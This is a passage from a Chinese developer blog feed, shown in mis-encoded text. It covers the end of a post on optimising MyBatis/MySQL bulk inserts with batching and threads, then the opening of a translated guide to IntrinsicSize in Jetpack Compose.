<h3 data-id="heading-1"><strong>ç¬¬ä¸€æ¬¡ä¼˜åŒ–ï¼šæ‰¹é‡SQLï¼ˆ30ç§’ï¼‰</strong></h3>
<p>æŠŠå¾ªç¯æ’å…¥æ”¹æˆæ‰¹é‡SQLï¼š</p>
<pre><code class="hljs language-ini" lang="ini">&lt;!-- Mapper.xml --&gt;
&lt;insert <span class="hljs-attr">id</span>=<span class="hljs-string">"batchInsert"</span>&gt;
Â  Â  INSERT INTO user (name, age, email) VALUES
Â  Â  &lt;foreach <span class="hljs-attr">collection</span>=<span class="hljs-string">"list"</span>Â item=<span class="hljs-string">"item"</span>Â separator=<span class="hljs-string">","</span>&gt;
Â  Â  Â  Â  (<span class="hljs-comment">#{item.name}, #{item.age}, #{item.email})</span>
Â  Â  &lt;/foreach&gt;
&lt;/insert&gt;
// åˆ†æ‰¹æ’å…¥ï¼Œæ¯æ‰¹1000æ¡
int <span class="hljs-attr">batchSize</span> = <span class="hljs-number">1000</span><span class="hljs-comment">;</span>
forÂ (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; userList.size(); i += batchSize) {</span>
Â  Â  int <span class="hljs-attr">end</span> = Math.min(i + batchSize, userList.size())<span class="hljs-comment">;</span>
Â  Â  List&lt;User&gt; <span class="hljs-attr">batch</span> = userList.subList(i, end)<span class="hljs-comment">;</span>
Â  Â  userMapper.batchInsert(batch)<span class="hljs-comment">;</span>
}
</code></pre>
<p>ä»5åˆ†é’Ÿé™åˆ°30ç§’ï¼Œæå‡10å€ã€‚</p>
<blockquote>
<p>â€œ</p>
<p>åŸç†ï¼šä¸€æ¡SQLæ’å…¥å¤šæ¡æ•°æ®ï¼Œå‡å°‘ç½‘ç»œå¾€è¿”æ¬¡æ•°ã€‚</p>
</blockquote>
<p>ä½†è¿˜æœ‰é—®é¢˜ï¼š30ç§’è¿˜æ˜¯å¤ªæ…¢ã€‚</p>
<h3 data-id="heading-2"><strong>ç¬¬äºŒæ¬¡ä¼˜åŒ–ï¼šJDBCæ‰¹å¤„ç†ï¼ˆ8ç§’ï¼‰</strong></h3>
<p>MySQLæœ‰ä¸ªå‚æ•°å«<code>rewriteBatchedStatements</code>ï¼Œå¼€å¯åå¯ä»¥æŠŠå¤šæ¡INSERTåˆå¹¶æˆä¸€æ¡ã€‚</p>
<h5 data-id="heading-3"><strong>ç¬¬ä¸€æ­¥ï¼šä¿®æ”¹æ•°æ®åº“è¿æ¥URL</strong></h5>
<pre><code class="hljs language-bash" lang="bash">jdbc:mysql://localhost:3306/test?rewriteBatchedStatements=<span class="hljs-literal">true</span>
</code></pre>
<h5 data-id="heading-4"><strong>ç¬¬äºŒæ­¥ï¼šä½¿ç”¨MyBatisçš„æ‰¹å¤„ç†æ¨¡å¼</strong></h5>
<pre><code class="hljs language-ini" lang="ini">@Autowired
private SqlSessionFactory sqlSessionFactory<span class="hljs-comment">;</span>

public void batchInsertWithExecutor(List&lt;User&gt; userList) {
Â  Â  try (SqlSession <span class="hljs-attr">sqlSession</span> = sqlSessionFactory.openSession(ExecutorType.BATCH)) {
Â  Â  Â  Â  UserMapper <span class="hljs-attr">mapper</span> = sqlSession.getMapper(UserMapper.class)<span class="hljs-comment">;</span>
Â  Â  Â  Â Â 
Â  Â  Â  Â  int <span class="hljs-attr">batchSize</span> = <span class="hljs-number">1000</span><span class="hljs-comment">;</span>
Â  Â  Â  Â Â forÂ (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; userList.size(); i++) {</span>
Â  Â  Â  Â  Â  Â  mapper.insert(userList.get(i))<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â Â ifÂ ((i + 1) % <span class="hljs-attr">batchSize</span> == <span class="hljs-number">0</span>) {
Â  Â  Â  Â  Â  Â  Â  Â  sqlSession.flushStatements()<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â  sqlSession.clearCache()<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  }
Â  Â  Â  Â  sqlSession.flushStatements()<span class="hljs-comment">;</span>
Â  Â  Â  Â  sqlSession.commit()<span class="hljs-comment">;</span>
Â  Â  }
}
</code></pre>
<p>ä»30ç§’é™åˆ°8ç§’ã€‚</p>
<blockquote>
<p>â€œ</p>
<p>åŸç†ï¼š<code>ExecutorType.BATCH</code>æ¨¡å¼ä¸‹ï¼ŒMyBatisä¼šç¼“å­˜SQLï¼Œæœ€åä¸€æ¬¡æ€§å‘é€ç»™æ•°æ®åº“æ‰§è¡Œã€‚é…åˆ<code>rewriteBatchedStatements=true</code>ï¼ŒMySQLé©±åŠ¨ä¼šæŠŠå¤šæ¡INSERTåˆå¹¶ã€‚</p>
</blockquote>
<h3 data-id="heading-5"><strong>ç¬¬ä¸‰æ¬¡ä¼˜åŒ–ï¼šå¤šçº¿ç¨‹å¹¶è¡Œï¼ˆ3ç§’ï¼‰</strong></h3>
<p>8ç§’è¿˜æ˜¯ä¸å¤Ÿå¿«ï¼Œä¸Šå¤šçº¿ç¨‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">public void parallelBatchInsert(List&lt;User&gt; userList) {
Â  Â  int <span class="hljs-attr">threadCount</span> = <span class="hljs-number">4</span><span class="hljs-comment">; Â // æ ¹æ®æ•°æ®åº“è¿æ¥æ± å¤§å°è°ƒæ•´</span>
Â  Â  int <span class="hljs-attr">batchSize</span> = userList.size() / threadCount<span class="hljs-comment">;</span>
Â  Â Â 
Â  Â  ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(threadCount)<span class="hljs-comment">;</span>
Â  Â  List&lt;Future&lt;?&gt;&gt; <span class="hljs-attr">futures</span> = new ArrayList&lt;&gt;()<span class="hljs-comment">;</span>
Â  Â Â 
Â  Â Â forÂ (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; threadCount; i++) {</span>
Â  Â  Â  Â  int <span class="hljs-attr">start</span> = i * batchSize<span class="hljs-comment">;</span>
Â  Â  Â  Â  int <span class="hljs-attr">end</span> = (i == threadCount - <span class="hljs-number">1</span>) ? userList.size() : (i + <span class="hljs-number">1</span>) * batchSize<span class="hljs-comment">;</span>
Â  Â  Â  Â  List&lt;User&gt; <span class="hljs-attr">subList</span> = userList.subList(start, end)<span class="hljs-comment">;</span>
Â  Â  Â  Â Â 
Â  Â  Â  Â  futures.add(executor.submit(() -&gt; {
Â  Â  Â  Â  Â  Â  batchInsertWithExecutor(subList)<span class="hljs-comment">;</span>
Â  Â  Â  Â  }))<span class="hljs-comment">;</span>
Â  Â  }
Â  Â Â 
Â  Â  // ç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆ
Â  Â Â forÂ (Future&lt;?&gt; future : futures) {
Â  Â  Â  Â  try {
Â  Â  Â  Â  Â  Â  future.get()<span class="hljs-comment">;</span>
Â  Â  Â  Â  } catch (Exception e) {
Â  Â  Â  Â  Â  Â  thrownew RuntimeException(e)<span class="hljs-comment">;</span>
Â  Â  Â  Â  }
Â  Â  }
Â  Â Â 
Â  Â  executor.shutdown()<span class="hljs-comment">;</span>
}
</code></pre>
<p>ä»8ç§’é™åˆ°3ç§’ã€‚</p>
<p>æ³¨æ„äº‹é¡¹ï¼š</p>
<ul>
<li>çº¿ç¨‹æ•°ä¸è¦è¶…è¿‡æ•°æ®åº“è¿æ¥æ± å¤§å°</li>
<li>å¦‚æœéœ€è¦äº‹åŠ¡ä¸€è‡´æ€§ï¼Œè¿™ä¸ªæ–¹æ¡ˆä¸é€‚ç”¨</li>
<li>è¦è€ƒè™‘ä¸»é”®å†²çªçš„é—®é¢˜</li>
</ul>
<h3 data-id="heading-6"><strong>ä¼˜åŒ–æ•ˆæœå¯¹æ¯”</strong></h3>






























<table><thead><tr><th>æ–¹æ¡ˆ</th><th>è€—æ—¶</th><th>æå‡å€æ•°</th></tr></thead><tbody><tr><td>å¾ªç¯å•æ¡æ’å…¥</td><td>300ç§’</td><td>åŸºå‡†</td></tr><tr><td>æ‰¹é‡SQL</td><td>30ç§’</td><td>10å€</td></tr><tr><td>JDBCæ‰¹å¤„ç†</td><td>8ç§’</td><td>37å€</td></tr><tr><td>å¤šçº¿ç¨‹å¹¶è¡Œ</td><td>3ç§’</td><td>100å€</td></tr></tbody></table>
<h3 data-id="heading-7"><strong>è¸©è¿‡çš„å‘</strong></h3>
<h5 data-id="heading-8"><strong>å‘1ï¼šforeachæ‹¼æ¥SQLè¿‡é•¿</strong></h5>
<pre><code class="hljs language-ini" lang="ini">&lt;foreach <span class="hljs-attr">collection</span>=<span class="hljs-string">"list"</span>Â item=<span class="hljs-string">"item"</span>Â separator=<span class="hljs-string">","</span>&gt;
</code></pre>
<p>å¦‚æœä¸€æ¬¡æ’å…¥å¤ªå¤šæ¡ï¼ŒSQLä¼šéå¸¸é•¿ï¼Œå¯èƒ½è¶…è¿‡<code>max_allowed_packet</code>é™åˆ¶ã€‚</p>
<p><strong>è§£å†³ï¼š</strong> Â åˆ†æ‰¹æ’å…¥ï¼Œæ¯æ‰¹500-1000æ¡ã€‚</p>
<h5 data-id="heading-9"><strong>å‘2ï¼šrewriteBatchedStatementsä¸ç”Ÿæ•ˆ</strong></h5>
<p>æ£€æŸ¥å‡ ä¸ªç‚¹ï¼š</p>
<ul>
<li>URLå‚æ•°æ˜¯å¦æ­£ç¡®ï¼š<code>rewriteBatchedStatements=true</code></li>
<li>æ˜¯å¦ä½¿ç”¨äº†<code>ExecutorType.BATCH</code></li>
<li>MySQLé©±åŠ¨ç‰ˆæœ¬æ˜¯å¦å¤ªæ—§</li>
</ul>
<h5 data-id="heading-10"><strong>å‘3ï¼šè‡ªå¢ä¸»é”®è¿”å›é—®é¢˜</strong></h5>
<p>æ‰¹é‡æ’å…¥æ—¶æƒ³è·å–è‡ªå¢ä¸»é”®ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">&lt;insert <span class="hljs-attr">id</span>=<span class="hljs-string">"batchInsert"</span>Â useGeneratedKeys=<span class="hljs-string">"true"</span>Â keyProperty=<span class="hljs-string">"id"</span>&gt;
</code></pre>
<p>æ³¨æ„ï¼š<code>rewriteBatchedStatements=true</code>æ—¶ï¼Œè‡ªå¢ä¸»é”®è¿”å›å¯èƒ½æœ‰é—®é¢˜ï¼Œéœ€è¦å‡çº§MySQLé©±åŠ¨åˆ°8.0.17+ã€‚</p>
<h5 data-id="heading-11"><strong>å‘4ï¼šå†…å­˜æº¢å‡º</strong></h5>
<p>10ä¸‡æ¡æ•°æ®ä¸€æ¬¡æ€§åŠ è½½åˆ°å†…å­˜ï¼Œå¯èƒ½OOMã€‚</p>
<p>è§£å†³ï¼šåˆ†é¡µè¯»å– + åˆ†æ‰¹æ’å…¥ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">int <span class="hljs-attr">pageSize</span> = <span class="hljs-number">10000</span><span class="hljs-comment">;</span>
int <span class="hljs-attr">total</span> = countTotal()<span class="hljs-comment">;</span>
forÂ (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; total; i += pageSize) {</span>
Â  Â  List&lt;User&gt; <span class="hljs-attr">page</span> = selectByPage(i, pageSize)<span class="hljs-comment">;</span>
Â  Â  batchInsertWithExecutor(page)<span class="hljs-comment">;</span>
}
</code></pre>
<h3 data-id="heading-12"><strong>æœ€ç»ˆæ–¹æ¡ˆä»£ç </strong></h3>
<pre><code class="hljs language-ini" lang="ini">@Service
publicclass BatchInsertService {
Â  Â Â 
Â  Â  @Autowired
Â  Â  private SqlSessionFactory sqlSessionFactory<span class="hljs-comment">;</span>
Â  Â Â 
Â  Â  /**
Â  Â  Â * é«˜æ€§èƒ½æ‰¹é‡æ’å…¥
Â  Â  Â * 10ä¸‡æ¡æ•°æ®çº¦3ç§’
Â  Â  Â */
Â  Â  public void highPerformanceBatchInsert(List&lt;User&gt; userList) {
Â  Â  Â  Â Â ifÂ (<span class="hljs-attr">userList</span> == null || userList.isEmpty()) {
Â  Â  Â  Â  Â  Â Â return<span class="hljs-comment">;</span>
Â  Â  Â  Â  }
Â  Â  Â  Â Â 
Â  Â  Â  Â  int <span class="hljs-attr">threadCount</span> = Math.min(<span class="hljs-number">4</span>, Runtime.getRuntime().availableProcessors())<span class="hljs-comment">;</span>
Â  Â  Â  Â  int <span class="hljs-attr">batchSize</span> = (int) Math.ceil((double) userList.size() / threadCount)<span class="hljs-comment">;</span>
Â  Â  Â  Â Â 
Â  Â  Â  Â  ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(threadCount)<span class="hljs-comment">;</span>
Â  Â  Â  Â  CountDownLatch <span class="hljs-attr">latch</span> = new CountDownLatch(threadCount)<span class="hljs-comment">;</span>
Â  Â  Â  Â Â 
Â  Â  Â  Â Â forÂ (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; threadCount; i++) {</span>
Â  Â  Â  Â  Â  Â  int <span class="hljs-attr">start</span> = i * batchSize<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  int <span class="hljs-attr">end</span> = Math.min((i + <span class="hljs-number">1</span>) * batchSize, userList.size())<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â Â ifÂ (start &gt;= userList.size()) {
Â  Â  Â  Â  Â  Â  Â  Â  latch.countDown()<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â Â continue<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  List&lt;User&gt; <span class="hljs-attr">subList</span> = new ArrayList&lt;&gt;(userList.subList(start, end))<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  executor.submit(() -&gt; {
Â  Â  Â  Â  Â  Â  Â  Â  try {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  doBatchInsert(subList)<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â  } finally {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  latch.countDown()<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  })<span class="hljs-comment">;</span>
Â  Â  Â  Â  }
Â  Â  Â  Â Â 
Â  Â  Â  Â  try {
Â  Â  Â  Â  Â  Â  latch.await()<span class="hljs-comment">;</span>
Â  Â  Â  Â  } catch (InterruptedException e) {
Â  Â  Â  Â  Â  Â  Thread.currentThread().interrupt()<span class="hljs-comment">;</span>
Â  Â  Â  Â  }
Â  Â  Â  Â Â 
Â  Â  Â  Â  executor.shutdown()<span class="hljs-comment">;</span>
Â  Â  }
Â  Â Â 
Â  Â  private void doBatchInsert(List&lt;User&gt; userList) {
Â  Â  Â  Â  try (SqlSession <span class="hljs-attr">sqlSession</span> = sqlSessionFactory.openSession(ExecutorType.BATCH,Â <span class="hljs-literal">false</span>)) {
Â  Â  Â  Â  Â  Â  UserMapper <span class="hljs-attr">mapper</span> = sqlSession.getMapper(UserMapper.class)<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â Â forÂ (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; userList.size(); i++) {</span>
Â  Â  Â  Â  Â  Â  Â  Â  mapper.insert(userList.get(i))<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  Â  Â Â ifÂ ((i + 1) % <span class="hljs-attr">1000</span> == <span class="hljs-number">0</span>) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  sqlSession.flushStatements()<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  sqlSession.clearCache()<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  sqlSession.flushStatements()<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  sqlSession.commit()<span class="hljs-comment">;</span>
Â  Â  Â  Â  }
Â  Â  }
}
</code></pre>
<h3 data-id="heading-13"><strong>æ€»ç»“</strong></h3>





















<table><thead><tr><th>ä¼˜åŒ–ç‚¹</th><th>å…³é”®é…ç½®</th></tr></thead><tbody><tr><td>æ‰¹é‡SQL</td><td>foreachæ‹¼æ¥ï¼Œåˆ†æ‰¹1000æ¡</td></tr><tr><td>JDBCæ‰¹å¤„ç†</td><td>rewriteBatchedStatements=true+ExecutorType.BATCH</td></tr><tr><td>å¤šçº¿ç¨‹</td><td>çº¿ç¨‹æ•° â‰¤ è¿æ¥æ± å¤§å°</td></tr></tbody></table>
<p><strong>æ ¸å¿ƒåŸåˆ™ï¼š</strong> Â å‡å°‘ç½‘ç»œå¾€è¿” + å‡å°‘äº‹åŠ¡æ¬¡æ•° + å¹¶è¡Œå¤„ç†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Composeä¸­çš„IntrinsicSizeå®æˆ˜æŒ‡å—]]></title>    <link>https://juejin.cn/post/7600787795478134830</link>    <guid>https://juejin.cn/post/7600787795478134830</guid>    <pubDate>2026-01-30T13:57:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600787795478134830" data-draft-id="7600955777316077606" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Composeä¸­çš„IntrinsicSizeå®æˆ˜æŒ‡å—"/> <meta itemprop="keywords" content="Android,Android Jetpack,Kotlin"/> <meta itemprop="datePublished" content="2026-01-30T13:57:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨€æœ‰çŒ¿è¯‰"/> <meta itemprop="url" content="https://juejin.cn/user/2788017216685784"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Composeä¸­çš„IntrinsicSizeå®æˆ˜æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2788017216685784/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨€æœ‰çŒ¿è¯‰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:57:33.000Z" title="Fri Jan 30 2026 13:57:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡è¯‘è‡ªã€ŒMastering IntrinsicSize in Jetpack Compose: A Real-World Guideã€ï¼ŒåŸæ–‡é“¾æ¥<a href="https://link.juejin.cn?target=https%3A%2F%2Fproandroiddev.com%2Fmastering-intrinsicsize-in-jetpack-compose-a-real-world-guide-a57ab90c6556" target="_blank" title="https://proandroiddev.com/mastering-intrinsicsize-in-jetpack-compose-a-real-world-guide-a57ab90c6556" ref="nofollow noopener noreferrer">proandroiddev.com/mastering-iâ€¦</a>ï¼Œç”±Sehaj kahlonå‘å¸ƒäº2026å¹´1æœˆ24æ—¥ã€‚</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/686bd52c0b2a4b4cb6a463af988b9e3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=4unr45DRgBAjml%2FKu9%2FTYzR3Bgw%3D" alt="0.png" loading="lazy"/></p>
<p>å¦‚æœä½ ä¸€ç›´åœ¨ä½¿ç”¨ Jetpack Composeï¼Œä½ å¯èƒ½é‡åˆ°è¿‡å¸ƒå±€è¡Œä¸ºä¸é¢„æœŸä¸ç¬¦çš„ä»¤äººæ²®ä¸§çš„æƒ…å†µã€‚ä¹Ÿè®¸æ˜¯ <code>Box</code> ä¸­çš„ <code>weight()</code> ä¿®é¥°ç¬¦å¯¼è‡´äº†å¥‡æ€ªçš„è¡Œä¸ºï¼Œæˆ–è€…ä½ çš„åˆ†å±‚ UI å…ƒç´ å¤§å°ä¸æ­£ç¡®ã€‚</p>
<p>è¿™æ—¶ <strong><code>IntrinsicSize</code></strong> å°±æ´¾ä¸Šç”¨åœºäº†â€”â€”ç›¸ä¿¡æˆ‘ï¼Œä¸€æ—¦ä½ ç†è§£äº†å®ƒï¼Œå®ƒå°†æˆä¸ºä½  Compose å·¥å…·ç®±ä¸­æœ€å¼ºå¤§çš„å·¥å…·ä¹‹ä¸€ã€‚</p>
<h2 data-id="heading-0">é—®é¢˜ï¼šä¸€ä¸ªçœŸå®çš„ç”Ÿäº§åœºæ™¯</h2>
<p>æœ€è¿‘ï¼Œæˆ‘æ­£åœ¨ä¸ºä¸€ä¸ªåº”ç”¨ç¨‹åºæ„å»ºè¯¦æƒ…é¡µé¢ã€‚è®¾è®¡è¦æ±‚ï¼š</p>
<ol>
<li>
<p>é¡¶éƒ¨æ”¾ç½®ä¸€å¼ <strong>æ ‡é¢˜å›¾ç‰‡</strong></p>
</li>
<li>
<p>ä¸€å¼ <strong>å¡ç‰‡</strong>ï¼Œä¸æ ‡é¢˜å›¾ç‰‡é‡å  56dp</p>
</li>
<li>
<p>ä»æ ‡é¢˜å›¾ç‰‡åˆ°æŸ”å’Œç°è‰²èƒŒæ™¯çš„<strong>å¹³æ»‘è¿‡æ¸¡</strong></p>
</li>
</ol>
<p>æˆ‘ä»¬æƒ³è¦å®ç°çš„æ•ˆæœå¦‚ä¸‹ï¼š</p>
<blockquote>
<p><em><strong>ğŸ’¡ è®¾è®¡ç›®æ ‡ï¼š</strong></em> <em>åˆ›å»ºä¸€ä¸ªå¡ç‰‡ï¼Œä½¿å…¶ä¼˜é›…åœ°ä¸æ ‡é¢˜å›¾ç‰‡é‡å ï¼Œå¹¶å®ç°æ— ç¼çš„èƒŒæ™¯è¿‡æ¸¡ã€‚</em></p>
</blockquote>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b027b0681c9444d90b46765cead83d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=vm6WiZb6vsTP2u32FoGpXi07S9o%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">æŒ‘æˆ˜</h2>
<p>æˆ‘éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«ä¸¤å±‚çš„â€œç›’å­Boxâ€ï¼š</p>
<ul>
<li>
<p><strong>å›¾å±‚ 1ï¼ˆèƒŒæ™¯ï¼‰ï¼š</strong> é¡¶éƒ¨ 56dp çš„é€æ˜åŒºåŸŸï¼Œç„¶åæ˜¯æŸ”å’Œçš„ç°è‰²èƒŒæ™¯</p>
</li>
<li>
<p><strong>å›¾å±‚ 2ï¼ˆå¡ç‰‡ï¼‰ï¼š</strong> ç»˜åˆ¶åœ¨é¡¶éƒ¨çš„å®é™…å¡ç‰‡å†…å®¹</p>
</li>
</ul>
<p>è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ä¸ªä½œå“å°è¯•ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
